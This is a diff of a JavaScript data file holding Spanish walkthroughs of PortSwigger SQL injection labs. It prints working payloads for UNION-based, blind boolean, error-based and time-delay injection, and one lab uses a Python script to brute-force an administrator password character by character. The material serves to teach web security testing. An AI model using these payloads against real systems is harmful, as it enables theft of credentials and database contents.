@@ -182,57 +182,7 @@ const labsData = [
         steps: [
             {
                 title: "Paso 1",
-                text: "●​ Intercepción: Se capturó la petición GET /filter?category=... en el Proxy",
-                code: ""
-            },
-            {
-                title: "Paso 2",
-                text: "Interceptor de Burp Suite.",
-                code: ""
-            },
-            {
-                title: "Paso 3",
-                text: "●​ Confirmación de Columnas: Se determinó que la consulta devuelve 2",
-                code: ""
-            },
-            {
-                title: "Paso 4",
-                text: "columnas inyectando ' ORDER BY 2--.",
-                code: ""
-            },
-            {
-                title: "Paso 5",
-                text: "●​ Enumeración de Tablas: Se consultó la tabla all_tables para encontrar la tabla",
-                code: ""
-            },
-            {
-                title: "Paso 6",
-                text: "de usuarios generada aleatoriamente.",
-                code: ""
-            },
-            {
-                title: "Paso 7",
-                text: "●​ Resultado: Se identificó la tabla USERS_GGYPYC.",
-                code: ""
-            },
-            {
-                title: "Paso 8",
-                text: "●​ Enumeración de Columnas: Se consultó all_tab_columns filtrando por el",
-                code: ""
-            },
-            {
-                title: "Paso 9",
-                text: "nombre de la tabla encontrada.",
-                code: ""
-            },
-            {
-                title: "Paso 10",
-                text: "●​ Resultado: Se identificaron las columnas USERNAME_OCIROF y",
-                code: ""
-            },
-            {
-                title: "Paso 11",
-                text: "PASSWORD_CAPDCE.",
+                text: "Intercepción: Se capturó la petición GET /filter?category=... en el Proxy Interceptor de Burp Suite. Confirmación de Columnas: Se determinó que la consulta devuelve 2 columnas inyectando ' ORDER BY 2--. Enumeración de Tablas: Se consultó la tabla all_tables para encontrar la tabla de usuarios generada aleatoriamente. Resultado: Se identificó la tabla USERS_GGYPYC. Enumeración de Columnas: Se consultó all_tab_columns filtrando por el nombre de la tabla encontrada. Resultado: Se identificaron las columnas USERNAME_OCIROF y PASSWORD_CAPDCE.",
                 code: ""
             },
             {
@@ -242,22 +192,7 @@ const labsData = [
             },
             {
                 title: "Paso 13",
-                text: "contraseña de la cuenta administrator.",
-                code: ""
-            },
-            {
-                title: "Paso 14",
-                text: "●​ Acceso: Inicio de sesión exitoso en el navegador Firefox (reemplazando la",
-                code: ""
-            },
-            {
-                title: "Paso 15",
-                text: "contraseña por la extraída).",
-                code: ""
-            },
-            {
-                title: "Análisis del Payload",
-                text: "Final  ●​ ' UNION SELECT USERNAME_OCIROF, PASSWORD_CAPDCE FROM  USERS_GGYPYC--  ●​ ': Cierra la comilla simple del parámetro category.  ●​ UNION SELECT: Combina nuestra consulta personalizada con los resultados  originales.  ●​ USERNAME_OCIROF, PASSWORD_CAPDCE: Son los nombres específicos de  las columnas que contienen la información sensible en Oracle.  ●​ FROM USERS_GGYPYC: La tabla de usuarios específica identificada durante la  fase de enumeración.  ●​ -- : Operador de comentario para anular el resto de la consulta SQL original.",
+                text: "contraseña de la cuenta administrator. Acceso: Inicio de sesión exitoso en el navegador Firefox (reemplazando la contraseña por la extraída). Final  ●​ ' UNION SELECT USERNAME_OCIROF, PASSWORD_CAPDCE FROM  USERS_GGYPYC--  ●​ ': Cierra la comilla simple del parámetro category.  ●​ UNION SELECT: Combina nuestra consulta personalizada con los resultados  originales.  ●​ USERNAME_OCIROF, PASSWORD_CAPDCE: Son los nombres específicos de  las columnas que contienen la información sensible en Oracle.  ●​ FROM USERS_GGYPYC: La tabla de usuarios específica identificada durante la  fase de enumeración.  ●​ -- : Operador de comentario para anular el resto de la consulta SQL original.",
                 code: ""
             },
         ],
@@ -281,22 +216,7 @@ const labsData = [
         steps: [
             {
                 title: "Paso 1",
-                text: "○​ Acceder a la categoría de productos (ej. \"Gifts\").",
-                code: ""
-            },
-            {
-                title: "Paso 2",
-                text: "○​ Interceptar la petición con Burp Suite.",
-                code: ""
-            },
-            {
-                title: "Paso 3",
-                text: "○​ Mandar el codigo de la pagina obtenido en el PROXY a REPEATER",
-                code: ""
-            },
-            {
-                title: "Paso 4",
-                text: ".",
+                text: "Acceder a la categoría de productos (ej. \"Gifts\"). Interceptar la petición con Burp Suite. Mandar el codigo de la pagina obtenido en el PROXY a REPEATER .",
                 code: ""
             },
             {
@@ -306,17 +226,7 @@ const labsData = [
             },
             {
                 title: "Paso 6",
-                text: "NULL--..",
-                code: ""
-            },
-            {
-                title: "Paso 7",
-                text: "○​ Cuando la página devuelva un error o falte contenido, el número de",
-                code: ""
-            },
-            {
-                title: "Paso 8",
-                text: "columnas será el valor anterior al error.",
+                text: "NULL--.. Cuando la página devuelva un error o falte contenido, el número de columnas será el valor anterior al error.",
                 code: ""
             },
             {
@@ -326,12 +236,7 @@ const labsData = [
             },
             {
                 title: "Paso 10",
-                text: "○​",
-                code: ""
-            },
-            {
-                title: "Análisis del Payload",
-                text: "El payload ' UNION SELECT NULL, NULL, NULL--  intenta fusionar la consulta original con una fila de tres valores nulos. Si la  consulta original devuelve exactamente 3 columnas, la operación es válida y la  página carga. Los guiones -- comentan el resto de la consulta original para evitar  errores sintácticos.",
+                text: " El payload ' UNION SELECT NULL, NULL, NULL--  intenta fusionar la consulta original con una fila de tres valores nulos. Si la  consulta original devuelve exactamente 3 columnas, la operación es válida y la  página carga. Los guiones -- comentan el resto de la consulta original para evitar  errores sintácticos.",
                 code: ""
             },
         ],
@@ -355,42 +260,7 @@ const labsData = [
         steps: [
             {
                 title: "Paso 1",
-                text: "○​ Acceder a la categoría de productos (ej. \"Corporate gifts\").",
-                code: ""
-            },
-            {
-                title: "Paso 2",
-                text: "○​ Al igual que con el anterior laboratorio: Interceptar la petición con Burp",
-                code: ""
-            },
-            {
-                title: "Paso 3",
-                text: "Suite y mandar el codigo de la pagina obtenido en el PROXY a",
-                code: ""
-            },
-            {
-                title: "Paso 4",
-                text: "REPEATER",
-                code: ""
-            },
-            {
-                title: "Paso 5",
-                text: "○​ Comprobar el número de columnas hallado como en el lab anterior",
-                code: ""
-            },
-            {
-                title: "Paso 6",
-                text: "(igualmente, 3 columnas en este caso).",
-                code: ""
-            },
-            {
-                title: "Paso 7",
-                text: "○​ Probar payloads moviendo una cadena única (ej. 'abc') entre las",
-                code: ""
-            },
-            {
-                title: "Paso 8",
-                text: "posiciones:",
+                text: "Acceder a la categoría de productos (ej. \"Corporate gifts\"). Al igual que con el anterior laboratorio: Interceptar la petición con Burp Suite y mandar el codigo de la pagina obtenido en el PROXY a REPEATER Comprobar el número de columnas hallado como en el lab anterior (igualmente, 3 columnas en este caso). Probar payloads moviendo una cadena única (ej. 'abc') entre las posiciones:",
                 code: ""
             },
         ],
@@ -414,22 +284,7 @@ const labsData = [
         steps: [
             {
                 title: "Paso 1",
-                text: "○​ Acceder a una de las categorías disponibles en la pagina (ej. \"Tech gifts\").",
-                code: ""
-            },
-            {
-                title: "Paso 2",
-                text: "○​ Utilizar Burp Suite para interceptar y modificar la solicitud que establece el",
-                code: ""
-            },
-            {
-                title: "Paso 3",
-                text: "filtro de categoría de producto.",
-                code: ""
-            },
-            {
-                title: "Paso 4",
-                text: "○​ Determinar que hay 2 columnas disponibles y que ambas aceptan texto.",
+                text: "Acceder a una de las categorías disponibles en la pagina (ej. \"Tech gifts\"). Utilizar Burp Suite para interceptar y modificar la solicitud que establece el filtro de categoría de producto. Determinar que hay 2 columnas disponibles y que ambas aceptan texto.",
                 code: ""
             },
             {
@@ -439,37 +294,7 @@ const labsData = [
             },
             {
                 title: "Paso 6",
-                text: "password FROM users--.",
-                code: ""
-            },
-            {
-                title: "Paso 7",
-                text: "○​ Localizar en la respuesta del navegador la lista de usuarios y",
-                code: ""
-            },
-            {
-                title: "Paso 8",
-                text: "contraseñas.",
-                code: ""
-            },
-            {
-                title: "Paso 9",
-                text: "○​ Identificar la credencial del usuario “administrador”.",
-                code: ""
-            },
-            {
-                title: "Paso 10",
-                text: "○​ Ir a la sección \"My account\" y loguearse con la contraseña obtenida.",
-                code: ""
-            },
-            {
-                title: "Paso 11",
-                text: "○​",
-                code: ""
-            },
-            {
-                title: "Análisis del Payload",
-                text: "La parte SELECT username, password FROM users  solicita a la base de datos que busque en la tabla users (una tabla común en  estos sistemas) y traiga los valores de las columnas de identificación. La unión  hace que estos datos aparezcan donde normalmente estarían los nombres de  los productos.   ●​",
+                text: "password FROM users--. Localizar en la respuesta del navegador la lista de usuarios y contraseñas. Identificar la credencial del usuario “administrador”. Ir a la sección \"My account\" y loguearse con la contraseña obtenida.  La parte SELECT username, password FROM users  solicita a la base de datos que busque en la tabla users (una tabla común en  estos sistemas) y traiga los valores de las columnas de identificación. La unión  hace que estos datos aparezcan donde normalmente estarían los nombres de  los productos.   ●​",
                 code: ""
             },
         ],
@@ -493,12 +318,7 @@ const labsData = [
         steps: [
             {
                 title: "Paso 1",
-                text: "Acceder a una de las categorías disponibles en la página (ej. \"Accesorios\" o \"Regalos\")",
-                code: ""
-            },
-            {
-                title: "Paso 2",
-                text: ".",
+                text: "Acceder a una de las categorías disponibles en la página (ej. \"Accesorios\" o \"Regalos\") .",
                 code: ""
             },
             {
@@ -508,37 +328,7 @@ const labsData = [
             },
             {
                 title: "Paso 4",
-                text: "NULL- - y probando hasta que no haya error. En este caso, se confirma que hay dos",
-                code: ""
-            },
-            {
-                title: "Paso 5",
-                text: "columnas.",
-                code: ""
-            },
-            {
-                title: "Paso 6",
-                text: "Determinar el tipo de datos de cada columna. Probar con un 'string' en la primera",
-                code: ""
-            },
-            {
-                title: "Paso 7",
-                text: "columna y ver que da error, indicando que es numérica. Probar con 'string' en la",
-                code: ""
-            },
-            {
-                title: "Paso 8",
-                text: "segunda columna y ver que no da error, indicando que acepta texto.",
-                code: ""
-            },
-            {
-                title: "Paso 9",
-                text: "Inyectar el payload para extraer datos. Se recomienda usar la concatenación de la",
-                code: ""
-            },
-            {
-                title: "Paso 10",
-                text: "primera columna (username) y la segunda (password) de la tabla users . El payload",
+                text: "NULL- - y probando hasta que no haya error. En este caso, se confirma que hay dos columnas. Determinar el tipo de datos de cada columna. Probar con un 'string' en la primera columna y ver que da error, indicando que es numérica. Probar con 'string' en la segunda columna y ver que no da error, indicando que acepta texto. Inyectar el payload para extraer datos. Se recomienda usar la concatenación de la primera columna (username) y la segunda (password) de la tabla users . El payload",
                 code: ""
             },
             {
@@ -548,37 +338,7 @@ const labsData = [
             },
             {
                 title: "Paso 12",
-                text: "introduce un punto y coma como separador entre el usuario y la contraseña.",
-                code: ""
-            },
-            {
-                title: "Paso 13",
-                text: "Localizar en la respuesta del navegador la lista de usuarios y contraseñas.",
-                code: ""
-            },
-            {
-                title: "Paso 14",
-                text: "Identificar la credencial del usuario “administrador” .",
-                code: ""
-            },
-            {
-                title: "Paso 15",
-                text: "Ir a la sección \"My account\" y loguearse con la contraseña obtenida.",
-                code: ""
-            },
-            {
-                title: "Paso 16",
-                text: "Confirmación: Inicio de sesión exitoso como administrador y el laboratorio se marca",
-                code: ""
-            },
-            {
-                title: "Paso 17",
-                text: "como resuelto.",
-                code: ""
-            },
-            {
-                title: "Análisis del Payload",
-                text: "La parte SELECT NULL, username || ':' || password FROM  users solicita a la base de datos que busque en la tabla users y traiga los valores de las  columnas username y password, concatenados y separados por un carácter. La  cláusula UNION hace que estos datos se añadan a la consulta original y aparezcan  donde normalmente estarían los nombres de los productos, en la segunda columna que  acepta strings.",
+                text: "introduce un punto y coma como separador entre el usuario y la contraseña. Localizar en la respuesta del navegador la lista de usuarios y contraseñas. Identificar la credencial del usuario “administrador” . Ir a la sección \"My account\" y loguearse con la contraseña obtenida. Confirmación: Inicio de sesión exitoso como administrador y el laboratorio se marca como resuelto. La parte SELECT NULL, username || ':' || password FROM  users solicita a la base de datos que busque en la tabla users y traiga los valores de las  columnas username y password, concatenados y separados por un carácter. La  cláusula UNION hace que estos datos se añadan a la consulta original y aparezcan  donde normalmente estarían los nombres de los productos, en la segunda columna que  acepta strings.",
                 code: ""
             },
         ],
@@ -602,22 +362,7 @@ const labsData = [
         steps: [
             {
                 title: "Paso 1",
-                text: "Acceder al laboratorio y observar el comportamiento de la aplicación:",
-                code: ""
-            },
-            {
-                title: "Paso 2",
-                text: "Navegar por las categorías (ej. \"Accessories\").",
-                code: ""
-            },
-            {
-                title: "Paso 3",
-                text: "Identificar el campo vulnerable (Cookies):",
-                code: ""
-            },
-            {
-                title: "Paso 4",
-                text: "Utilizar Burp Suite para interceptar la solicitud y modificar el valor de la cookie",
+                text: "Acceder al laboratorio y observar el comportamiento de la aplicación: Navegar por las categorías (ej. \"Accessories\"). Identificar el campo vulnerable (Cookies): Utilizar Burp Suite para interceptar la solicitud y modificar el valor de la cookie",
                 code: ""
             },
             {
@@ -632,17 +377,7 @@ const labsData = [
             },
             {
                 title: "Paso 7",
-                text: "Observar que el mensaje \"Welcome Back\" desaparece, lo que indica una inyección",
-                code: ""
-            },
-            {
-                title: "Paso 8",
-                text: "SQL efectiva",
-                code: ""
-            },
-            {
-                title: "Paso 9",
-                text: "Confirmar la existencia de la tabla users:",
+                text: "Observar que el mensaje \"Welcome Back\" desaparece, lo que indica una inyección SQL efectiva Confirmar la existencia de la tabla users:",
                 code: ""
             },
             {
@@ -652,22 +387,7 @@ const labsData = [
             },
             {
                 title: "Paso 11",
-                text: "FROM users WHERE 'a'='a' LIMIT 1)--",
-                code: ""
-            },
-            {
-                title: "Paso 12",
-                text: "Si la tabla users existe, el mensaje \"Welcome Back\" reaparecerá . Si no, desaparecerá.",
-                code: ""
-            },
-            {
-                title: "Paso 13",
-                text: "Confirmar la existencia del usuario administrator:",
-                code: ""
-            },
-            {
-                title: "Paso 14",
-                text: "Inyectar el siguiente payload: ' AND (SELECT username FROM users WHERE",
+                text: "FROM users WHERE 'a'='a' LIMIT 1)-- Si la tabla users existe, el mensaje \"Welcome Back\" reaparecerá . Si no, desaparecerá. Confirmar la existencia del usuario administrator: Inyectar el siguiente payload: ' AND (SELECT username FROM users WHERE",
                 code: ""
             },
             {
@@ -677,27 +397,7 @@ const labsData = [
             },
             {
                 title: "Paso 16",
-                text: "Si el usuario administrator existe, el mensaje \"Welcome Back\" reaparecerá.Si no,",
-                code: ""
-            },
-            {
-                title: "Paso 17",
-                text: "desaparecerá.",
-                code: ""
-            },
-            {
-                title: "Paso 18",
-                text: "Determinar la longitud de la contraseña del administrador:",
-                code: ""
-            },
-            {
-                title: "Paso 19",
-                text: "Inyectar payloads para probar la longitud de la contraseña. Por ejemplo, para saber si",
-                code: ""
-            },
-            {
-                title: "Paso 20",
-                text: "es mayor a 19 caracteres: ' AND (SELECT username FROM users WHERE username",
+                text: "Si el usuario administrator existe, el mensaje \"Welcome Back\" reaparecerá.Si no, desaparecerá. Determinar la longitud de la contraseña del administrador: Inyectar payloads para probar la longitud de la contraseña. Por ejemplo, para saber si es mayor a 19 caracteres: ' AND (SELECT username FROM users WHERE username",
                 code: ""
             },
             {
@@ -707,22 +407,7 @@ const labsData = [
             },
             {
                 title: "Paso 22",
-                text: "Ajustar el número hasta que el mensaje \"Welcome Back\" reaparezca, indicando la",
-                code: ""
-            },
-            {
-                title: "Paso 23",
-                text: "longitud correcta (la contraseña tiene 20 caracteres).",
-                code: ""
-            },
-            {
-                title: "Paso 24",
-                text: "El payload base para cada carácter es: ' AND (SELECT SUBSTRING(password,",
-                code: ""
-            },
-            {
-                title: "Paso 25",
-                text: "{posición_caracter}, 1) FROM users WHERE username = 'administrator') =",
+                text: "Ajustar el número hasta que el mensaje \"Welcome Back\" reaparezca, indicando la longitud correcta (la contraseña tiene 20 caracteres). El payload base para cada carácter es: ' AND (SELECT SUBSTRING(password, {posición_caracter}, 1) FROM users WHERE username = 'administrator') =",
                 code: ""
             },
             {
@@ -732,42 +417,7 @@ const labsData = [
             },
             {
                 title: "Paso 27",
-                text: "Si el carácter probado en la posición actual es correcto, el mensaje \"Welcome Back\"",
-                code: ""
-            },
-            {
-                title: "Paso 28",
-                text: "reaparecerá. El script registrará el carácter y pasará a la siguiente posición.",
-                code: ""
-            },
-            {
-                title: "Paso 29",
-                text: "Se usará un script de Python que automatiza este proceso.",
-                code: ""
-            },
-            {
-                title: "Paso 30",
-                text: "●​ request:  para  hacer peticiones al servidor.",
-                code: ""
-            },
-            {
-                title: "Paso 31",
-                text: "●​ string: añadir los caracteres que queremos que se prueben.",
-                code: ""
-            },
-            {
-                title: "Paso 32",
-                text: "●​ urllib.parse: para evitar el https del servidor.",
-                code: ""
-            },
-            {
-                title: "Paso 33",
-                text: "●​ urllib3: para python 3",
-                code: ""
-            },
-            {
-                title: "Paso 34",
-                text: "Funcionamiento del codigo:",
+                text: "Si el carácter probado en la posición actual es correcto, el mensaje \"Welcome Back\" reaparecerá. El script registrará el carácter y pasará a la siguiente posición. Se usará un script de Python que automatiza este proceso. request:  para  hacer peticiones al servidor. string: añadir los caracteres que queremos que se prueben. urllib.parse: para evitar el https del servidor. urllib3: para python 3 Funcionamiento del codigo:",
                 code: ""
             },
             {
@@ -782,22 +432,7 @@ const labsData = [
             },
             {
                 title: "Paso 37",
-                text: "●​ \"';\": Se añade para cerrar la instrucción SQL original y permitir la inyección.",
-                code: ""
-            },
-            {
-                title: "Paso 38",
-                text: "●​ payload_url.format(i, char): Aquí es donde la plantilla del payload se formatea",
-                code: ""
-            },
-            {
-                title: "Paso 39",
-                text: "con la posición actual (i) y el carácter a probar (char).",
-                code: ""
-            },
-            {
-                title: "Paso 40",
-                text: "●​ requests.get(url, ...): Envía una petición GET a la url del laboratorio.",
+                text: "\"';\": Se añade para cerrar la instrucción SQL original y permitir la inyección. payload_url.format(i, char): Aquí es donde la plantilla del payload se formatea con la posición actual (i) y el carácter a probar (char). requests.get(url, ...): Envía una petición GET a la url del laboratorio.",
                 code: ""
             },
             {
@@ -807,27 +442,7 @@ const labsData = [
             },
             {
                 title: "Paso 42",
-                text: "payload SQL construido.",
-                code: ""
-            },
-            {
-                title: "Paso 43",
-                text: "●​ verify=False: Desactiva la verificación del certificado SSL/TLS del servidor, lo",
-                code: ""
-            },
-            {
-                title: "Paso 44",
-                text: "que a menudo es necesario en entornos de prueba o si hay problemas con los",
-                code: ""
-            },
-            {
-                title: "Paso 45",
-                text: "certificados.",
-                code: ""
-            },
-            {
-                title: "Paso 46",
-                text: "●​ if \"Welcome back\" in r.text:: El script verifica si el mensaje \"Welcome back\"",
+                text: "payload SQL construido. verify=False: Desactiva la verificación del certificado SSL/TLS del servidor, lo que a menudo es necesario en entornos de prueba o si hay problemas con los certificados. if \"Welcome back\" in r.text:: El script verifica si el mensaje \"Welcome back\"",
                 code: ""
             },
             {
@@ -837,77 +452,7 @@ const labsData = [
             },
             {
                 title: "Paso 48",
-                text: "que la condición SQL inyectada fue verdadera, y por lo tanto, el carácter",
-                code: ""
-            },
-            {
-                title: "Paso 49",
-                text: "adivinado es correcto para esa posición.",
-                code: ""
-            },
-            {
-                title: "Paso 50",
-                text: "●​ contraseña += char: Si el carácter es correcto, se añade a la variable",
-                code: ""
-            },
-            {
-                title: "Paso 51",
-                text: "contraseña.",
-                code: ""
-            },
-            {
-                title: "Paso 52",
-                text: "●​ break: Una vez que se encuentra el carácter correcto para la posición actual, el",
-                code: ""
-            },
-            {
-                title: "Paso 53",
-                text: "bucle interior se rompe, y el script pasa a la siguiente posición de la contraseña.",
-                code: ""
-            },
-            {
-                title: "Paso 54",
-                text: "Damos permisos al archivo y lo ejecutamos para obtener la contraseña , es importante",
-                code: ""
-            },
-            {
-                title: "Paso 55",
-                text: "decir que al reiniciar el laboratorio la cookie cambia por lo tanto la contraseña tambien",
-                code: ""
-            },
-            {
-                title: "Paso 56",
-                text: "lo hará.",
-                code: ""
-            },
-            {
-                title: "Paso 57",
-                text: "Iniciar sesión con las credenciales obtenidas:",
-                code: ""
-            },
-            {
-                title: "Paso 58",
-                text: "Una vez que el script haya extraído la contraseña completa, ir a la sección \"My",
-                code: ""
-            },
-            {
-                title: "Paso 59",
-                text: "account\" del laboratorio.",
-                code: ""
-            },
-            {
-                title: "Paso 60",
-                text: "Ingresar administrator como nombre de usuario y la contraseña obtenida.",
-                code: ""
-            },
-            {
-                title: "Paso 61",
-                text: "Iniciar sesión para resolver el laboratorio.",
-                code: ""
-            },
-            {
-                title: "Análisis del Payload",
-                text: "Los payloads utilizan operadores lógicos (AND) y funciones  SQL (SELECT, LENGTH, SUBSTRING) dentro de la sección de la cookie TrackingId.  Esto permite al atacante construir consultas que, aunque no devuelven datos  directamente, alteran el comportamiento de la página (el mensaje \"Welcome Back\") de  una manera que revela información sobre la base de datos de forma ciega.",
+                text: "que la condición SQL inyectada fue verdadera, y por lo tanto, el carácter adivinado es correcto para esa posición. contraseña += char: Si el carácter es correcto, se añade a la variable contraseña. break: Una vez que se encuentra el carácter correcto para la posición actual, el bucle interior se rompe, y el script pasa a la siguiente posición de la contraseña. Damos permisos al archivo y lo ejecutamos para obtener la contraseña , es importante decir que al reiniciar el laboratorio la cookie cambia por lo tanto la contraseña tambien lo hará. Iniciar sesión con las credenciales obtenidas: Una vez que el script haya extraído la contraseña completa, ir a la sección \"My account\" del laboratorio. Ingresar administrator como nombre de usuario y la contraseña obtenida. Iniciar sesión para resolver el laboratorio. Los payloads utilizan operadores lógicos (AND) y funciones  SQL (SELECT, LENGTH, SUBSTRING) dentro de la sección de la cookie TrackingId.  Esto permite al atacante construir consultas que, aunque no devuelven datos  directamente, alteran el comportamiento de la página (el mensaje \"Welcome Back\") de  una manera que revela información sobre la base de datos de forma ciega.",
                 code: ""
             },
         ],
@@ -931,52 +476,7 @@ const labsData = [
         steps: [
             {
                 title: "Paso 1",
-                text: "Acceder al laboratorio y comprender la vulnerabilidad:",
-                code: ""
-            },
-            {
-                title: "Paso 2",
-                text: "Ingresar al laboratorio y observar que las categorías no son vulnerables.",
-                code: ""
-            },
-            {
-                title: "Paso 3",
-                text: "Identificar que la inyección se realiza en el campo tracking ID de las cookie como indica",
-                code: ""
-            },
-            {
-                title: "Paso 4",
-                text: "en el lab.",
-                code: ""
-            },
-            {
-                title: "Paso 5",
-                text: "Modificar el tracking ID y verificar que una comilla simple (') genera un error ,",
-                code: ""
-            },
-            {
-                title: "Paso 6",
-                text: "confirmando la vulnerabilidad.",
-                code: ""
-            },
-            {
-                title: "Paso 7",
-                text: "Preparar Burp Suite para la inyección:",
-                code: ""
-            },
-            {
-                title: "Paso 8",
-                text: "Interceptar la petición y enviarla al Repeater.",
-                code: ""
-            },
-            {
-                title: "Paso 9",
-                text: "Determinar el tipo de base de datos:",
-                code: ""
-            },
-            {
-                title: "Paso 10",
-                text: "Inyectar un payload de prueba como ' || (SELECT '') || ' y observar que genera un error",
+                text: "Acceder al laboratorio y comprender la vulnerabilidad: Ingresar al laboratorio y observar que las categorías no son vulnerables. Identificar que la inyección se realiza en el campo tracking ID de las cookie como indica en el lab. Modificar el tracking ID y verificar que una comilla simple (') genera un error , confirmando la vulnerabilidad. Preparar Burp Suite para la inyección: Interceptar la petición y enviarla al Repeater. Determinar el tipo de base de datos: Inyectar un payload de prueba como ' || (SELECT '') || ' y observar que genera un error",
                 code: ""
             },
         ],
@@ -1000,17 +500,7 @@ const labsData = [
         steps: [
             {
                 title: "Paso 1",
-                text: "Accederemos a la instancia que nos genere PortSwigger desde el navegador integrado",
-                code: ""
-            },
-            {
-                title: "Paso 2",
-                text: "de BurpSuite (sin tener activado el interceptor).",
-                code: ""
-            },
-            {
-                title: "Paso 3",
-                text: "Exploraremos la página para cargar distintas instancias. Una vez exploradas, irémos a",
+                text: "Accederemos a la instancia que nos genere PortSwigger desde el navegador integrado de BurpSuite (sin tener activado el interceptor). Exploraremos la página para cargar distintas instancias. Una vez exploradas, irémos a",
                 code: ""
             },
             {
@@ -1035,57 +525,7 @@ const labsData = [
             },
             {
                 title: "Paso 8",
-                text: "medio del repetidor. Al enviarla y explorar en el contenido HTML, podemos observar",
-                code: ""
-            },
-            {
-                title: "Paso 9",
-                text: "que nos muestra un error de consulta SQL.",
-                code: ""
-            },
-            {
-                title: "Paso 10",
-                text: "​",
-                code: ""
-            },
-            {
-                title: "Paso 11",
-                text: "Ahora sabemos que el contenido de la cookie sirve para realizar una consulta SQL.",
-                code: ""
-            },
-            {
-                title: "Paso 12",
-                text: "Añadirémos los caracteres de comentario (“--” en SQL) Si no nos muestra ningún error",
-                code: ""
-            },
-            {
-                title: "Paso 13",
-                text: "significa que nuestra consulta será válida de manera sintática.",
-                code: ""
-            },
-            {
-                title: "Paso 14",
-                text: "Después de la comilla simple, añadiremos la consulta “AND CAST((SELECT 1)) AS",
-                code: ""
-            },
-            {
-                title: "Paso 15",
-                text: "int)--”. De esta manera adaptaremos la consulta para incluir una subconsulta SELECT",
-                code: ""
-            },
-            {
-                title: "Paso 16",
-                text: "genérica y convertir el valor devuelto a un tipo de datos int.",
-                code: ""
-            },
-            {
-                title: "Paso 17",
-                text: "Como podremos ver, al enviar la solicitud nos arroja un error diciendo que la condición",
-                code: ""
-            },
-            {
-                title: "Paso 18",
-                text: "“AND” debe ser una exrpesión booleana. Modificaremos la condición, añadiendo un",
+                text: "medio del repetidor. Al enviarla y explorar en el contenido HTML, podemos observar que nos muestra un error de consulta SQL.  Ahora sabemos que el contenido de la cookie sirve para realizar una consulta SQL. Añadirémos los caracteres de comentario (“--” en SQL) Si no nos muestra ningún error significa que nuestra consulta será válida de manera sintática. Después de la comilla simple, añadiremos la consulta “AND CAST((SELECT 1)) AS int)--”. De esta manera adaptaremos la consulta para incluir una subconsulta SELECT genérica y convertir el valor devuelto a un tipo de datos int. Como podremos ver, al enviar la solicitud nos arroja un error diciendo que la condición “AND” debe ser una exrpesión booleana. Modificaremos la condición, añadiendo un",
                 code: ""
             },
             {
@@ -1095,17 +535,7 @@ const labsData = [
             },
             {
                 title: "Paso 20",
-                text: "Al ejecutarla nos podremos dar cuenta que no arroja ningún error, por lo que la consulta",
-                code: ""
-            },
-            {
-                title: "Paso 21",
-                text: "SQL ahora tendrá la sintáxis correcta.",
-                code: ""
-            },
-            {
-                title: "Paso 22",
-                text: "Ahora, para la inyección, adaptaremos un SELECT genérico para que recupere los",
+                text: "Al ejecutarla nos podremos dar cuenta que no arroja ningún error, por lo que la consulta SQL ahora tendrá la sintáxis correcta. Ahora, para la inyección, adaptaremos un SELECT genérico para que recupere los",
                 code: ""
             },
             {
@@ -1115,27 +545,7 @@ const labsData = [
             },
             {
                 title: "Paso 24",
-                text: "users) AS int)--”.",
-                code: ""
-            },
-            {
-                title: "Paso 25",
-                text: "Obtendremos un error de nuevo. Nuestra consulta parece haberse truncado por el",
-                code: ""
-            },
-            {
-                title: "Paso 26",
-                text: "límite de caracteres permitido. Como resultado, los caracteres que añadimos para",
-                code: ""
-            },
-            {
-                title: "Paso 27",
-                text: "comentar la consulta (“--”) se ignoraron. Para solucionar esto, eliminaremos el",
-                code: ""
-            },
-            {
-                title: "Paso 28",
-                text: "contenido original de la cookie, para, de esta manera, liberar algunos caracteres,",
+                text: "users) AS int)--”. Obtendremos un error de nuevo. Nuestra consulta parece haberse truncado por el límite de caracteres permitido. Como resultado, los caracteres que añadimos para comentar la consulta (“--”) se ignoraron. Para solucionar esto, eliminaremos el contenido original de la cookie, para, de esta manera, liberar algunos caracteres,",
                 code: ""
             },
             {
@@ -1145,22 +555,7 @@ const labsData = [
             },
             {
                 title: "Paso 30",
-                text: "AS int)--”.",
-                code: ""
-            },
-            {
-                title: "Paso 31",
-                text: "Observamos que recibimos un nuevo mensaje de error, que parece haber sido",
-                code: ""
-            },
-            {
-                title: "Paso 32",
-                text: "generado por la base de datos. Esto sugiere que la consulta se ejecutó correctamente,",
-                code: ""
-            },
-            {
-                title: "Paso 33",
-                text: "pero sigue recibiendo un error porque la consulta devolvió más de una fila. La",
+                text: "AS int)--”. Observamos que recibimos un nuevo mensaje de error, que parece haber sido generado por la base de datos. Esto sugiere que la consulta se ejecutó correctamente, pero sigue recibiendo un error porque la consulta devolvió más de una fila. La",
                 code: ""
             },
             {
@@ -1175,12 +570,7 @@ const labsData = [
             },
             {
                 title: "Paso 36",
-                text: "Ya enviada la consulta, sabremos que el primer usuario en nuestra tabla es",
-                code: ""
-            },
-            {
-                title: "Paso 37",
-                text: "“administrator”. Ahora modificaremos la consulta para que nos muestre la contraseña:",
+                text: "Ya enviada la consulta, sabremos que el primer usuario en nuestra tabla es “administrator”. Ahora modificaremos la consulta para que nos muestre la contraseña:",
                 code: ""
             },
             {
@@ -1190,17 +580,7 @@ const labsData = [
             },
             {
                 title: "Paso 39",
-                text: "La contraseña se ha filtrado, siendo “n0qruhn61643ghsw146z”. Ahora podremos iniciar",
-                code: ""
-            },
-            {
-                title: "Paso 40",
-                text: "sesión con el usuario administrador y su contraseña, y de esta manera, completar el",
-                code: ""
-            },
-            {
-                title: "Paso 41",
-                text: "laboratorio.",
+                text: "La contraseña se ha filtrado, siendo “n0qruhn61643ghsw146z”. Ahora podremos iniciar sesión con el usuario administrador y su contraseña, y de esta manera, completar el laboratorio.",
                 code: ""
             },
         ],
@@ -1249,12 +629,7 @@ const labsData = [
             },
             {
                 title: "Paso 6",
-                text: "cómo tardará 10 segundos en cargarla.",
-                code: ""
-            },
-            {
-                title: "Paso 7",
-                text: "Una vez cargada la solicitud, el laboratorio aparecerá como completado.",
+                text: "cómo tardará 10 segundos en cargarla. Una vez cargada la solicitud, el laboratorio aparecerá como completado.",
                 code: ""
             },
         ],
@@ -1312,12 +687,7 @@ const labsData = [
         steps: [
             {
                 title: "Paso 1",
-                text: "●​ Intercepción: Abrir el navegador integrado de Burp Suite, acceder al laboratorio",
-                code: ""
-            },
-            {
-                title: "Paso 2",
-                text: "y capturar la petición GET inicial para enviarla al Repeater.",
+                text: "Intercepción: Abrir el navegador integrado de Burp Suite, acceder al laboratorio y capturar la petición GET inicial para enviarla al Repeater.",
                 code: ""
             },
             {
@@ -1327,32 +697,7 @@ const labsData = [
             },
             {
                 title: "Paso 4",
